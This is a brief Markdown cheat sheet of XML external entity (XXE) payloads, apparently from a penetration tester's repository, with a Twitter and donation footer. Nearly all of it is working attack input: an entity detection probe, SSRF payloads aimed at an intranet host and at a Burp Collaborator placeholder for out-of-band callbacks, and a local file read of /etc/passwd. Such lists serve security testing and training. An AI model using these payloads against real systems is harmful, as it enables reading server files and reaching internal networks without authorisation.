# XXE - Cheat Sheet

### Detect
```
<!--?xml version="1.0" ?-->
<!DOCTYPE replace [<!ENTITY test "pentest"> ]>
<root><xxe>&test;</xxe></root>
```

### SSRF
```
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "<http://intranet.cheeseshop.com>"> ]>
<foo>dumdum</foo>
  
 
<!DOCTYPE foo PUBLIC "-//dummy//Bug//dummy"  "http://<BURP-COLLAB/">
<foo>testing</foo>
```

### LFI
```
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<foo>&xxe;</foo>
```

<br>&nbsp;
## References:
[Reference](ref)</br>


<br>&nbsp;
## Support
You can Follow [me](https://twitter.com/MeAsHacker_HNA) on twitter or
<br><br><a href="https://www.buymeacoffee.com/NafisiAslH" target="_blank"><img src="https://cdn.buymeacoffee.com/buttons/v2/default-yellow.png" alt="Buy Me A Coffee" style="height: 60px !important;width: 217px !important;" ></a>
